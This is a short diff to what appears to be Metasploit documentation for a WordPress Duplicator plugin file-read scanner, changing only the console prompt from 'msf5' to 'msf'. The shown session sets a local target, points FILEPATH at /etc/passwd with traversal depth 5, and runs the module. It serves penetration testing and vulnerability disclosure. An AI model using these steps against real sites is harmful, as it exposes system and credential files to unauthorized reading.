@@ -24,17 +24,17 @@ Vulnerable version: [duplicator.1.3.24.zip](https://downloads.wordpress.org/plug
 ### Ubuntu 20.04 running WordPress 5.6, Duplicator 1.3.26
 
 ```
-msf5 > use auxiliary/scanner/http/wp_duplicator_file_read
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rhosts 127.0.0.1
+msf > use auxiliary/scanner/http/wp_duplicator_file_read
+msf auxiliary(scanner/http/wp_duplicator_file_read) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rport 8080
+msf auxiliary(scanner/http/wp_duplicator_file_read) > set rport 8080
 rport => 8080
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH /etc/passwd
+msf auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH /etc/passwd
 FILEPATH => /etc/passwd
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set DEPTH 5
+msf auxiliary(scanner/http/wp_duplicator_file_read) > set DEPTH 5
 DEPTH => 5
 
-msf5 auxiliary(scanner/http/wp_duplicator_file_read) > run
+msf auxiliary(scanner/http/wp_duplicator_file_read) > run
 
 [*] Downloading file...
 
